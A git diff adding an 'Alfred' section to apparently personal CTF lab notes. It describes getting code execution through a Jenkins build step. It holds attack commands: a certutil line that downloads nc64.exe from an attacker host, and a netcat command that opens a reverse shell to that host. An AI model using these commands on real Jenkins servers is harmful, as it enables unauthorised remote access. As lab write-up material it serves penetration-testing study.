@@ -99,8 +99,45 @@ But if we call it using the menu command interface we get the flag:
     ** Enter your choice :3
     177b3cd8562289f37382721c28381f02
 
-## Steel Mountain
+## Alfred
+### Execute DOS command in jenkins
+1. In a project, select configure, Scroll down to the Buil section, insert your command there: download netcat from the attacker machine and verify
 
+       certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"   && dir
+2. Build the project (it will take a while since nc has tobe downloaded)
+3. Then select the first entry in the Build history section
+4. Then click Console output and you should see something similar:
+
+        Started by user admin
+        Running as SYSTEM
+        Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
+        [project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins2706411477596705408.bat
+        
+        C:\Program Files (x86)\Jenkins\workspace\project>certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"     && dir
+        ****  Online  ****
+          0000  ...
+          b0d8
+        CertUtil: -URLCache command completed successfully.
+         Volume in drive C has no label.
+         Volume Serial Number is E033-3EDD
+        
+         Directory of C:\Program Files (x86)\Jenkins\workspace\project
+        
+        04/30/2024  10:37 AM    <DIR>          .
+        04/30/2024  10:37 AM    <DIR>          ..
+        04/30/2024  10:37 AM            45,272 nc64.exe
+                       2 File(s)      4,908,760 bytes
+                       2 Dir(s)  20,509,741,056 bytes free
+        
+        C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
+        Finished: SUCCESS
+
+
+Then we can repeat the previous steps, change the command (1) to get a reverse shell:
+
+    nc64.exe 10.9.0.171 1234 -e cmd.exe
+
+Build again the project and you should get a reverse shell on your attacker machine
     
     
 
